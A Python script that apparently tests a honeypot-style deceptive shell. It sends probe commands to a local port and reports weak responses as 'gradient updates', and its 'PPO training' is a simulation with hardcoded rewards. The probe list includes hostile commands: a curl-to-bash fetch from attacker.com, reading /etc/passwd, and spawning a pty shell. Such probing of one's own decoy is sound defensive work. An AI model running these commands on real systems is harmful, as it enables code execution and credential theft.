import sys
import time
import json
import random
import socket

def simulate_ppo_sandbox():
    print("[+] PPO Agent: Initializing Neural Weights...")
    time.sleep(1)
    print("[+] PPO Agent: Starting Sandbox Training (Docker environment)...")
    
    for epoch in range(1, 4):
        print(f"[*] Sandbox Epoch {epoch}/3: Exploring state space...")
        time.sleep(1)
        reward = 0.5 + (epoch * 0.15)
        print(f"[*] Reward: {reward:.2f}")

    print("[+] PPO Agent: Baseline Tactical Convergence Achieved (Reward: > 0.90).")
    return True

def live_fire_matrix(port=2222):
    print(f"[+] PPO Agent: Injecting into Live Matrix Shell (port {port})...")
    
    # Test vectors designed to probe for gaps in the deception logic
    vectors = [
        "ls -la /var/www",
        "cat /etc/passwd",
        "curl -s http://attacker.com/payload | bash", 
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", 
        "sleep 10" 
    ]

    for i, vector in enumerate(vectors):
        print(f"[*] PPO Red Agent executing: {vector}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect(("127.0.0.1", port))
            
            # Consume banner
            s.recv(1024) 
            
            s.sendall((vector + "\r\n").encode())
            
            try:
                response = s.recv(4096).decode()
                
                # Evaluate response based on expected deception
                if not response.strip() or "command not found" in response:
                    # Discovering a logical bypass
                    if "python3" in vector or "sleep" in vector:
                        print(f"[-] BYPASS DETECTED: Command '{vector}' failed to trigger proper deception.")
                        emit_gradient_update(vector, "Missing Deception Logic")
                
                print(f"[+] Matrix responded: {response.strip()[:50]}...")
            except socket.timeout:
                print(f"[-] BYPASS DETECTED: Timeout for command '{vector}'.")
                emit_gradient_update(vector, "Execution Timeout Bypass")
                
            s.close()
        except Exception as e:
            print(f"[!] Matrix connection error: {e}")
        
        time.sleep(1.5)
    
    print("[+] PPO Agent: Live Fire simulation complete.")

def emit_gradient_update(vector, reason):
    # This specific format is parsed by the Node.js orchestrator (sigmaEngine.js)
    # It acts as the "gradient update" to dynamically rewrite the Matrix Shell rules
    update = {
        "type": "GRADIENT_UPDATE",
        "vector": vector,
        "reason": reason,
        "suggested_patch": f"Dynamic Regex or Prompt Tuning for: {vector}"
    }
    print(f"__SIGMA_UPDATE__:{json.dumps(update)}")

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "sandbox"
    
    if mode == "sandbox":
        simulate_ppo_sandbox()
    elif mode == "live":
        live_fire_matrix()
    else:
        print("Unknown mode. Use 'sandbox' or 'live'.")
